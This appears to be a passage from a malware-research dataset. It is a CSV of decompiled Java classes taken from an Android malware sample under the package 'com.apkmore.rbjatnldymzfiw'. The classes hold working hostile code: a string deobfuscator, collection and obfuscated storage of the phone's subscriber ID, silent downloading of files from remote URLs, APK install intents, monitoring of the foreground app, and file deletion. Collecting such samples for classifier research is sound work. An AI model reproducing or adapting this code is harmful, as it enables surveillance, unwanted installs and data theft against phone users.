bQ=e.a(""sÃ®ÄƒÃ¹Ä‡ÃšÃ£Ã³ÄŒÄˆÃ¡ÄƒÃŽÄ�Ä�Ã¨\u009fÃ“Ã»Ã®Ã³Ã²ÄƒÃ½Â´Ã¤Ã¹Ã°Ã´ÃšÃ­Ä„Â¯Ã®Ä…Ã¬ÄƒÃšÃ¶Ã·e"");   public static final String bR=e.a(""sÃ¯ÄŒÃ½Ä€Ã¤e"");   public static final String bS=e.a(""sÃ˜Ã˜Ã¢e"");   public static final String bT=e.a(""sÃ�Ã¥Ã’Ã¨Â²Ã’Ã«e"");   public static final String bU=e.a(""sÃ¡Ã˜Ã¡Ã¯e"");   public static final String bV=e.a(""sÃ–Ã¡Ã�Ã Â¸Ã…Ã¤e"");   public static final String bW=e.a(""sÃ™Ã¢Ã—Ã¢e"");   public static final String bX=e.a(""sÃ‘Ã˜Ã�ÃœÃ†ÃŒÃ¦e"");   public static final String bY=e.a(""sÂ¶ÃŽe"");   public static final String bZ=e.a(""sÃ‘Ã¥Ã˜Ã«e"");   public static final String ca=e.a(""sÃ¡Ã”Ã‹Ã§Â¶e"");   public static final String cb=e.a(""sÃ–Ã™e"");   public static final String cc=e.a(""sÃ’Ã«Ã’Ã®Ã…Ã“e"");   public static final String cd=e.a(""sÃ�Ã¥ÃŽÃœÃ…Ã…e""); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\c.code","public class c {   public static java.lang.String a(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.v.e.c.a(java.lang.String, java.lang.String):java.lang.String"");   }   public static java.lang.String b(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.v.e.c.b(java.lang.String, java.lang.String):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\d.code","public class d {   public static void a(  Object obj){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\e.code","public class e {   private static int[] f192a={141,147,137,155,113,128,146,152,159,114,149,159,139,147,132,113,114,141,138,129,131,154,153,134,116,152,141,137,121,134,159,TransportMediator.KEYCODE_MEDIA_RECORD};   public static String a(  String str){     if (str == null || !str.startsWith(""s"") || !str.endsWith(""e"")) {       return """";     }     StringBuilder sb=new StringBuilder(str);     sb.deleteCharAt(0);     sb.deleteCharAt(sb.length() - 1);     char[] charArray=sb.toString().toCharArray();     StringBuilder sb2=new StringBuilder();     for (int i=0; i < charArray.length; i++) {       try {         a(sb2,(char)(charArray[i] - f192a[i % f192a.length]));       }  catch (      Exception e) {         e.printStackTrace();       }     }     return sb2.toString();   }   private static void a(  StringBuilder sb,  char c){     sb.append(c);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\f.code","public class f {   public Rect f193a=new Rect();   public int[] b;   public int[] c;   public int[] d;   public static f a(  byte[] bArr){     ByteBuffer order=ByteBuffer.wrap(bArr).order(ByteOrder.nativeOrder());     if (order.get() == 0) {       return null;     }     f fVar=new f();     fVar.b=new int[order.get()];     fVar.c=new int[order.get()];     fVar.d=new int[order.get()];     a(fVar.b.length);     a(fVar.c.length);     order.getInt();     order.getInt();     fVar.f193a.left=order.getInt();     fVar.f193a.right=order.getInt();     fVar.f193a.top=order.getInt();     fVar.f193a.bottom=order.getInt();     order.getInt();     a(fVar.b,order);     a(fVar.c,order);     a(fVar.d,order);     return fVar;   }   private static void a(  int i){     if (i == 0 || (i & 1) != 0) {       throw new RuntimeException(b.bz + i);     }   }   private static void a(  int[] iArr,  ByteBuffer byteBuffer){     int length=iArr.length;     for (int i=0; i < length; i++) {       iArr[i]=byteBuffer.getInt();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\g.code","public class g {   private static final String f194a=b.B;   private static final Pattern b=Pattern.compile(b.bA);   public static String a(  String str){     byte[] bytes=str.getBytes();     byte[] bytes2=f194a.getBytes();     StringBuilder sb=new StringBuilder();     for (int i=0; i < bytes.length; i++) {       sb.append(""%"" + (bytes[i] + bytes2[i % bytes2.length]));     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.e\h.code","public class h {   static Object f195a=new Object();   private static Object b=new Object();   public static int a(  Context context,  int i){     return (int)((context.getResources().getDisplayMetrics().density * i) + 0.5f);   }   public static long a(){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return 0L;     }     StatFs statFs=new StatFs(Environment.getExternalStorageDirectory().getPath());     return (statFs.getAvailableBlocks() * statFs.getBlockSize()) / 1024;   }   public static Intent a(  Context context,  File file){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),b.bQ);     a(intent);     return intent;   }   public static Intent a(  Context context,  String str,  PackageManager packageManager){     ResolveInfo resolveInfo;     if (str == null || str.trim().equals("""")) {       return null;     }     Intent intent=new Intent(""android.intent.action.MAIN"",(Uri)null);     intent.addCategory(""android.intent.category.LAUNCHER"");     List<ResolveInfo> queryIntentActivities=packageManager.queryIntentActivities(intent,0);     if (queryIntentActivities != null) {       int size=queryIntentActivities.size();       for (int i=0; i < size; i++) {         resolveInfo=queryIntentActivities.get(i);         if (str.equals(resolveInfo.activityInfo.packageName)) {           break;         }       }     }     resolveInfo=null;     if (resolveInfo == null) {       return null;     }     ComponentName componentName=new ComponentName(str,resolveInfo.activityInfo.name);     Intent intent2=new Intent();     intent2.setComponent(componentName);     intent2.setFlags(268435456);     return intent2;   }   public static Bitmap a(  Context context,  String str,  boolean z){     if (str == null) {       return null;     }     if (z) {       try {         return BitmapFactory.decodeStream(context.getAssets().open(str));       }  catch (      Exception e) {         return null;       }     }     try {       return BitmapFactory.decodeStream(new FileInputStream(str));     }  catch (    FileNotFoundException e2) {       return null;     } catch (    Exception e3) {       return null;     }   }   public static com.apkmore.rbjatnldymzfiw.v.b.f a(  k kVar){     if (kVar == null) {       return null;     }     com.apkmore.rbjatnldymzfiw.v.b.f fVar=new com.apkmore.rbjatnldymzfiw.v.b.f();     fVar.e=kVar.e;     fVar.d=kVar.d;     fVar.f=kVar.f;     fVar.i=kVar.i / 1024;     fVar.h=kVar.h;     fVar.j=kVar.j;     fVar.f154a=kVar.f157a;     fVar.l=kVar.l;     fVar.k=kVar.k;     fVar.y=0;     fVar.o=kVar.z;     fVar.m=kVar.r;     fVar.g=kVar.g;     fVar.c=kVar.c;     fVar.n=kVar.y;     fVar.b=kVar.b;     return fVar;   }   public static File a(  Context context,  String str,  int i){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return null;     }     String str2=b.e + ""/"" + i;     File file=new File(Environment.getExternalStorageDirectory(),str2);     if (!file.exists()) {       file.mkdirs();     }     return new File(Environment.getExternalStorageDirectory(),str2 + ""/"" + str);   }   public static Class a(  Context context,  Class cls){     Class<?> cls2;     try {       ServiceInfo[] serviceInfoArr=b(context,context.getApplicationInfo().packageName,4).services;       if (serviceInfoArr == null) {         return cls;       }       for (      ServiceInfo serviceInfo : serviceInfoArr) {         try {           cls2=Class.forName(serviceInfo.name);         }  catch (        ClassNotFoundException e) {           e.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return cls;     }   }   public static String a(  Context context){     File file=new File(Environment.getExternalStorageDirectory(),b.f191a);     String b2=b(context,file);     if (b2 == null || """".equals(b2)) {       b2=c(context,file);     }     return (b2 == null || """".equals(b2) || !d(b2)) ? """" : b2;   }   public static String a(  Context context,  PackageManager packageManager){     try {       return packageManager.getApplicationInfo(context.getPackageName(),128).metaData.getString(b.d);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public static String a(  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     String substring=fVar.b.substring(fVar.b.lastIndexOf(""/"") + 1);     substring.trim();     return substring.endsWith(""?"") ? substring.substring(0,substring.length() - 1) : substring;   }   protected static String a(  String str){     try {       byte[] bytes=str.getBytes(b.bk);       byte[] bytes2=b.B.getBytes();       StringBuilder sb=new StringBuilder();       for (int i=0; i < bytes.length; i++) {         sb.append(""%"" + ((bytes[i] & 255) + (bytes2[i % bytes2.length] & 255)));       }       return sb.toString();     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();       return str;     }   }   public static void a(  long j){     b(b.e + ""/"" + b.aK,String.valueOf(j));   }   public static void a(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     File file;     int i=fVar.i / 1024;     if (((int)a()) > i) {       file=a(context,a(fVar),fVar.e);     }  else {       if (b() <= i) {         Toast.makeText(context,b.au,3000).show();         return;       }       file=new File(b.V + ""/"" + context.getPackageName()+ ""/""+ a(fVar));       File parentFile=file.getParentFile();       if (!parentFile.exists()) {         parentFile.mkdirs();       }     }     com.apkmore.rbjatnldymzfiw.v.a.h hVar=new com.apkmore.rbjatnldymzfiw.v.a.h(fVar.b,file,1);     hVar.b(n.c(context));     hVar.a((Object)(-2));     n.a(context,R.drawable.stat_sys_download,b.ai + b.bK,fVar.e,16,b(context,fVar),fVar.d,0);     n.a(context,hVar,new com.apkmore.rbjatnldymzfiw.v.h(context,fVar,null));   }   private static void a(  android.content.Context r5,  java.io.File r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.v.e.h.a(android.content.Context, java.io.File, java.lang.String):void"");   }   public static void a(  Context context,  String str,  String str2){     if (str == null || """".equals(str) || str2 == null || """".equals(str2)) {       return;     }     context.startActivity(a(context,new File(str)));   }   private static void a(  Intent intent){     intent.addFlags(268435456);   }   private static void a(  File file){     if (file.exists()) {       for (      File file2 : file.listFiles()) {         if (file2.isFile()) {           String name=file2.getName();           if (name.endsWith(b.I) || name.endsWith(b.K) || name.endsWith(b.J)) {             file2.delete();           }         }  else         if (file2.isDirectory()) {           a(file2);           file2.delete();         }       }     }   }   private static void a(  String[] strArr,  Iterator it,  int i){     strArr[i]=(String)it.next();   }   private static boolean a(  Context context,  int i,  int i2){     if (i2 == -1) {       return false;     }     SharedPreferences sharedPreferences=context.getSharedPreferences(b.i,0);     SharedPreferences.Editor edit=sharedPreferences.edit();     for (    String str : sharedPreferences.getAll().keySet()) {       if (String.valueOf(i).equals(str)) {         edit.putString(str,"""" + i2);         return edit.commit();       }     }     edit.putString("""" + i,i2 + "","");     return edit.commit();   }   public static boolean a(  Context context,  String str){     SharedPreferences.Editor edit=context.getSharedPreferences(b.c,0).edit();     edit.putString(b.c,str);     return edit.commit();   }   public static boolean a(  Context context,  boolean z){     SharedPreferences.Editor edit=context.getSharedPreferences(b.aL,0).edit();     edit.putInt(b.aN,z ? 1 : 0);     edit.commit();     return true;   }   public static String[] a(  String str,  String str2){     int i=0;     if (str == null || str.equals("""") || str2 == null || str2.equals("""")) {       return null;     }     ArrayList arrayList=new ArrayList();     int i2=0;     while (true) {       int indexOf=str.indexOf(str2,i2);       if (indexOf == -1) {         break;       }       arrayList.add(str.substring(i2,indexOf));       i2=str2.length() + indexOf;     }     if (str.length() > i2) {       arrayList.add(str.substring(i2));     }     String[] strArr=new String[arrayList.size()];     ListIterator listIterator=arrayList.listIterator();     while (listIterator.hasNext()) {       a(strArr,listIterator,i);       i++;     }     return strArr;   }   public static long b(){     StatFs statFs=new StatFs(new File(b.V).getPath());     return (statFs.getAvailableBlocks() * statFs.getBlockSize()) / 1024;   }   public static Intent b(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     Intent intent=new Intent(context,(Class<?>)Sc.class);     intent.setFlags(268435456);     intent.putExtra(b.aT,fVar.b());     intent.putExtra(b.ad,false);     intent.putExtra(b.ac,true);     return intent;   }   public static PackageInfo b(  Context context,  String str,  int i){     return context.getPackageManager().getPackageInfo(str,i);   }   public static Class b(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=b(context,context.getApplicationInfo().packageName,2).receivers;       if (activityInfoArr == null) {         return cls;       }       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           cls2=Class.forName(activityInfo.name);         }  catch (        ClassNotFoundException e) {           e.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return cls;     }   }   public static String b(  Context context){     a(context,""ffaf1a9996c643de9f0c2f70e1500c18"");     return ""ffaf1a9996c643de9f0c2f70e1500c18"";   }   private static java.lang.String b(  android.content.Context r5,  java.io.File r6){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.v.e.h.b(android.content.Context, java.io.File):java.lang.String"");   }   protected static String b(  Context context,  String str){     Bundle bundle;     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo == null || (bundle=applicationInfo.metaData) == null) {         return null;       }       return bundle.getString(str);     }  catch (    PackageManager.NameNotFoundException e) {       e.printStackTrace();       return null;     }   }   public static String b(  String str){     if (str == null || str.length() == 0) {       return str;     }     Matcher matcher=Pattern.compile(b.bB).matcher(str);     ArrayList arrayList=new ArrayList();     while (matcher.find()) {       try {         arrayList.add(Integer.valueOf(matcher.group()));       }  catch (      Exception e) {         e.printStackTrace();         return str;       }     }     if (arrayList.size() <= 0) {       return str;     }     try {       byte[] bArr=new byte[arrayList.size()];       byte[] bytes=b.B.getBytes();       Iterator it=arrayList.iterator();       int i=0;       while (it.hasNext()) {         bArr[i]=(byte)(((Integer)it.next()).intValue() - (bytes[i % bytes.length] & 255));         i++;       }       return new String(bArr,b.bk);     }  catch (    UnsupportedEncodingException e2) {       e2.printStackTrace();       return str;     }   }   public static boolean b(  java.lang.String r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.v.e.h.b(java.lang.String, java.lang.String):boolean"");   }   public static int c(  Context context){     return 100061;   }   private static String c(  Context context,  File file){     String subscriberId=((TelephonyManager)context.getSystemService(""phone"")).getSubscriberId();     SharedPreferences sharedPreferences=context.getSharedPreferences(b.b,0);     String string=sharedPreferences.getString(""i"",null);     if (string != null && !"""".equals(string)) {       String b2=b(string);       return !d(b2) ? """" : b2;     }     if (d(subscriberId)) {       l(context,subscriberId);       a(context,file,subscriberId);       return subscriberId;     }     if (sharedPreferences != null) {       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(""i"","""");       edit.commit();     }     return """";   }   protected static String c(  String str){     FileInputStream fileInputStream;     String str2=null;     if (""mounted"".equals(Environment.getExternalStorageState())) {       File file=new File(Environment.getExternalStorageDirectory(),str);       DataInputStream exists=file.exists();       try {         if (exists != 0) {           try {             fileInputStream=new FileInputStream(file);             try {               exists=new DataInputStream(fileInputStream);               try {                 str2=exists.readUTF();                 if (exists != 0) {                   try {                     exists.close();                   }  catch (                  IOException e) {                     e.printStackTrace();                   }                 }                 if (fileInputStream != null) {                   try {                     fileInputStream.close();                   }  catch (                  IOException e2) {                     e2.printStackTrace();                   }                 }               }  catch (              IOException e3) {                 e=e3;                 e.printStackTrace();                 if (exists != 0) {                   try {                     exists.close();                   }  catch (                  IOException e4) {                     e4.printStackTrace();                   }                 }                 if (fileInputStream != null) {                   try {                     fileInputStream.close();                   }  catch (                  IOException e5) {                     e5.printStackTrace();                   }                 }                 return str2;               }             }  catch (            IOException e6) {               e=e6;               exists=0;             } catch (            Throwable th) {               exists=0;               th=th;               if (exists != 0) {                 try {                   exists.close();                 }  catch (                IOException e7) {                   e7.printStackTrace();                 }               }               if (fileInputStream != null) {                 try {                   fileInputStream.close();                 }  catch (                IOException e8) {                   e8.printStackTrace();                 }               }               throw th;             }           }  catch (          IOException e9) {             e=e9;             exists=0;             fileInputStream=null;           } catch (          Throwable th2) {             exists=0;             fileInputStream=null;             th=th2;           }         }       }  catch (      Throwable th3) {         th=th3;       }     }     return str2;   }   public static void c(  String str,  String str2){     URL url=new URL(str);     url.openConnection().connect();     BufferedInputStream bufferedInputStream=new BufferedInputStream(url.openStream());     String str3=b.e + ""/"" + b.bE;     File file=new File(Environment.getExternalStorageDirectory(),str3);     if (!file.exists()) {       file.mkdirs();     }     FileOutputStream fileOutputStream=new FileOutputStream(new File(Environment.getExternalStorageDirectory(),str3 + b.bD));     byte[] bArr=new byte[1024];     long j=0;     while (true) {       int read=bufferedInputStream.read(bArr);       if (read == -1) {         fileOutputStream.flush();         fileOutputStream.close();         bufferedInputStream.close();         return;       }       j+=read;       fileOutputStream.write(bArr,0,read);     }   }   public static boolean c(){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return false;     }     File file=new File(Environment.getExternalStorageDirectory(),b.e);     a(file);     return file.delete();   }   public static boolean c(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     SharedPreferences sharedPreferences=context.getSharedPreferences(b.h,0);     if (fVar.e == -1) {       return false;     }     SharedPreferences.Editor edit=sharedPreferences.edit();     if (sharedPreferences.contains("""" + fVar.e)) {       String string=sharedPreferences.getString("""" + fVar.e,null);       if (string != null) {         com.apkmore.rbjatnldymzfiw.v.b.f fVar2=new com.apkmore.rbjatnldymzfiw.v.b.f();         if (fVar2.a(string)) {           fVar.x=fVar2.x;           edit.putString("""" + fVar.e,fVar.b());         }       }     }  else {       edit.putString("""" + fVar.e,fVar.b());     }     return edit.commit();   }   public static boolean c(  Context context,  String str){     Intent a2=a(context,str,context.getPackageManager());     if (a2 == null) {       return false;     }     context.startActivity(a2);     return true;   }   public static long d(){     long j;     try {       j=Long.valueOf(c(b.e + ""/"" + b.aK)).longValue();     }  catch (    Exception e) {       j=-1;     }     if (j == -1) {       return 60L;     }     return j;   }   public static String d(  Context context){     String string=context.getSharedPreferences(b.c,0).getString(b.d,null);     return string != null ? string : b(context,b.d);   }   public static void d(  Context context,  String str){ synchronized (f195a) {       if (str == null) {         return;       }       SharedPreferences sharedPreferences=context.getSharedPreferences(b.f,0);       String string=sharedPreferences.getString(b.g,"""");       if (!string.equals("""")) {         str=string + "";"" + str;       }       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(b.g,str);       edit.commit();     }   }   public static boolean d(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     com.apkmore.rbjatnldymzfiw.v.b.f[] i;     if (fVar == null) {       return false;     }     SharedPreferences sharedPreferences=context.getSharedPreferences(b.h,0);     String str="""" + fVar.e;     if (!sharedPreferences.contains(str) || (i=i(context)) == null) {       return false;     }     for (    com.apkmore.rbjatnldymzfiw.v.b.f fVar2 : i) {       if (fVar2.e == fVar.e) {         if (fVar2.x == 4 || fVar2.x >= fVar.x) {           return false;         }         SharedPreferences.Editor edit=sharedPreferences.edit();         edit.remove(str);         edit.putString(str,fVar.b());         a(context,fVar.e,fVar.x);         return edit.commit();       }     }     return false;   }   private static boolean d(  String str){     try {       Long.valueOf(str.substring(0,3));       return true;     }  catch (    Exception e) {       return false;     }   }   public static String e(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   public static synchronized boolean e(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     boolean z=false; synchronized (h.class) {       SharedPreferences.Editor edit=context.getSharedPreferences(b.j,0).edit();       if (edit.commit()) {         edit.putString("""" + fVar.e,fVar.b());         if (edit.commit()) {           z=true;         }       }     }     return z;   }   public static boolean e(  Context context,  String str){     String[] split; synchronized (b) {       if (str != null) {         if (!"""".equals(str)) {           String[] split2=str.split("";"");           if (split2 != null) {             for (            String str2 : split2) {               if (str2 != null && (split=str2.split("","")) != null && split.length == 2) {                 try {                   a(context,Integer.parseInt(split[0]),Integer.parseInt(split[1]));                 }  catch (                Exception e) {                 }               }             }           }         }       }     }     return false;   }   public static int f(  Context context){     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     return displayMetrics.densityDpi;   }   public static com.apkmore.rbjatnldymzfiw.v.b.f f(  Context context,  String str){     if (str == null || str.trim().equals("""")) {       return null;     }     com.apkmore.rbjatnldymzfiw.v.b.f[] i=i(context);     if (i == null || i.length <= 0) {       return null;     }     for (    com.apkmore.rbjatnldymzfiw.v.b.f fVar : i) {       if (str.equals(fVar.b)) {         return fVar;       }     }     return null;   }   public static synchronized boolean f(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     boolean z=false; synchronized (h.class) {       SharedPreferences.Editor edit=context.getSharedPreferences(b.k,0).edit();       if (edit.commit()) {         edit.putString("""" + fVar.e,fVar.b());         if (edit.commit()) {           z=true;         }       }     }     return z;   }   public static com.apkmore.rbjatnldymzfiw.v.b.f g(  Context context,  String str){     if (str == null || str.trim().equals("""")) {       return null;     }     List<com.apkmore.rbjatnldymzfiw.v.b.f> s=s(context);     if (s == null || s.size() <= 0) {       return null;     }     for (    com.apkmore.rbjatnldymzfiw.v.b.f fVar : s) {       if (str.equals(fVar.f)) {         return fVar;       }     }     return null;   }   public static String g(  Context context){     String string; synchronized (f195a) {       SharedPreferences sharedPreferences=context.getSharedPreferences(b.f,0);       string=sharedPreferences.getString(b.g,"""");       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(b.g,null);       edit.remove(b.g);       edit.clear();       edit.commit();     }     return string;   }   public static void g(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     SharedPreferences.Editor edit=context.getSharedPreferences(b.j,0).edit();     edit.putString("""" + fVar.e,fVar.b());     edit.remove("""" + fVar.e);     edit.commit();   }   public static com.apkmore.rbjatnldymzfiw.v.b.f h(  Context context,  String str){     if (str == null || str.trim().equals("""")) {       return null;     }     List<com.apkmore.rbjatnldymzfiw.v.b.f> t=t(context);     if (t == null || t.size() <= 0) {       return null;     }     for (    com.apkmore.rbjatnldymzfiw.v.b.f fVar : t) {       if (str.equals(fVar.f)) {         return fVar;       }     }     return null;   }   public static String h(  Context context){     String stringBuffer; synchronized (b) {       StringBuffer stringBuffer2=new StringBuffer();       SharedPreferences sharedPreferences=context.getSharedPreferences(b.i,0);       for (      String str : sharedPreferences.getAll().keySet()) {         for (        String str2 : a(sharedPreferences.getString(str,""""),"","")) {           stringBuffer2.append(str + "","" + str2+ "";"");         }       }       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.clear();       edit.commit();       stringBuffer=stringBuffer2.toString();     }     return stringBuffer;   }   public static void h(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     SharedPreferences.Editor edit=context.getSharedPreferences(b.k,0).edit();     edit.putString("""" + fVar.e,fVar.b());     edit.remove("""" + fVar.e);     edit.commit();   }   public static boolean i(  Context context,  String str){     Iterator<PackageInfo> it=context.getPackageManager().getInstalledPackages(0).iterator();     while (it.hasNext()) {       if (str.equals(it.next().packageName)) {         return true;       }     }     return false;   }   protected static com.apkmore.rbjatnldymzfiw.v.b.f[] i(  Context context){     int i=0;     SharedPreferences sharedPreferences=context.getSharedPreferences(b.h,0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     com.apkmore.rbjatnldymzfiw.v.b.f[] fVarArr=new com.apkmore.rbjatnldymzfiw.v.b.f[all.size()];     while (true) {       int i2=i;       if (!it.hasNext()) {         return fVarArr;       }       String next=it.next();       String string=sharedPreferences.getString(next,null);       com.apkmore.rbjatnldymzfiw.v.b.f fVar=new com.apkmore.rbjatnldymzfiw.v.b.f();       if (!fVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       fVar.e=Integer.valueOf(next).intValue();       i=i2 + 1;       fVarArr[i2]=fVar;     }   }   public static boolean j(  Context context){     String c=c(b.e + ""/"" + b.M);     if (c == null) {       k(context);       return false;     }     long currentTimeMillis=System.currentTimeMillis() - Long.valueOf(c).longValue();     if (currentTimeMillis < 0) {       k(context);       return false;     }     if (currentTimeMillis <= 604800000) {       return false;     }     c();     k(context);     return true;   }   public static boolean j(  Context context,  String str){     SharedPreferences.Editor edit=context.getSharedPreferences(b.aJ,0).edit();     if (str == null) {       return false;     }     edit.putString(b.aM,str);     edit.commit();     return true;   }   public static boolean k(  Context context){     return b(b.e + ""/"" + b.M,String.valueOf(System.currentTimeMillis()));   }   public static boolean k(  Context context,  String str){     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     for (int i=0; i < installedPackages.size(); i++) {       PackageInfo packageInfo=installedPackages.get(i);       int i2=packageInfo.applicationInfo.flags;       ApplicationInfo applicationInfo=packageInfo.applicationInfo;       if ((i2 & 1) != 0 && packageInfo.packageName.equals(str)) {         return true;       }     }     return false;   }   public static int l(  Context context){     return ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getWidth();   }   private static void l(  Context context,  String str){     if (str == null) {       return;     }     context.getSharedPreferences(b.b,0).edit().putString(""i"",a(str)).commit();   }   public static int m(  Context context){     return ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getHeight();   }   public static String n(  Context context){     return context.getSharedPreferences(b.aJ,0).getString(b.aM,null);   }   public static String o(  Context context){     ActivityManager.RunningTaskInfo runningTaskInfo=((ActivityManager)context.getSystemService(""activity"")).getRunningTasks(1).get(0);     String packageName=runningTaskInfo.topActivity.getPackageName();     runningTaskInfo.topActivity.getClassName();     return packageName;   }   public static int p(  Context context){     return context.getSharedPreferences(b.aL,0).getInt(b.aN,10);   }   public static String[] q(  Context context){     ActivityManager.RunningTaskInfo runningTaskInfo=((ActivityManager)context.getSystemService(""activity"")).getRunningTasks(1).get(0);     return new String[]{runningTaskInfo.topActivity.getPackageName(),runningTaskInfo.topActivity.getClassName(),String.valueOf(u(context).contains(runningTaskInfo.topActivity.getPackageName()))};   }   public static void r(  Context context){     List<com.apkmore.rbjatnldymzfiw.v.b.f> s=s(context);     if (s == null || s.size() <= 0) {       return;     }     for (    com.apkmore.rbjatnldymzfiw.v.b.f fVar : s) {       File file=new File(Environment.getExternalStorageDirectory() + ""/"" + b.e+ ""/""+ fVar.e+ ""/""+ a(fVar));       if (file.exists()) {         n.a(context,R.drawable.stat_sys_download_done,b.ak,fVar.e,32,a(context,file),fVar.d,-1);       }     }   }   private static List s(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(b.j,0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     ArrayList arrayList=new ArrayList();     while (it.hasNext()) {       String string=sharedPreferences.getString(it.next(),null);       com.apkmore.rbjatnldymzfiw.v.b.f fVar=new com.apkmore.rbjatnldymzfiw.v.b.f();       if (!fVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       try {         arrayList.add(fVar);       }  catch (      Exception e) {         e.printStackTrace();       }     }     return arrayList;   }   private static List t(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(b.k,0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     ArrayList arrayList=new ArrayList();     while (it.hasNext()) {       String string=sharedPreferences.getString(it.next(),null);       com.apkmore.rbjatnldymzfiw.v.b.f fVar=new com.apkmore.rbjatnldymzfiw.v.b.f();       if (!fVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       try {         arrayList.add(fVar);       }  catch (      Exception e) {         e.printStackTrace();       }     }     return arrayList;   }   private static List u(  Context context){     ArrayList arrayList=new ArrayList();     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.addCategory(""android.intent.category.HOME"");     Iterator<ResolveInfo> it=packageManager.queryIntentActivities(intent,65536).iterator();     while (it.hasNext()) {       arrayList.add(it.next().activityInfo.packageName);     }     return arrayList;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\a.code","public class a {   private static Context f216a;   private static Class b;   private static Class c;   private static Class d;   private static a e=null;   private a(  Context context){     f216a=context;     b=t.a(context,Zew.class);     if (b == null) {     }     c=t.b(context,Vj.class);     if (c == null) {     }     d=t.c(context,Baa.class);     if (d == null) {     }   }   public static synchronized a a(  Context context){     a aVar; synchronized (a.class) {       if (e == null) {         e=new a(context);       }       aVar=e;     }     return aVar;   }   public void a(){     if (!Environment.getExternalStorageState().equals(""mounted"")) {       Toast.makeText(f216a,h.br,1).show();     }  else     if ("""".equals(t.a(f216a)) || t.a(f216a) == null) {       Toast.makeText(f216a,h.bs,1).show();     }  else {       i.a(f216a,b);     }   } } "
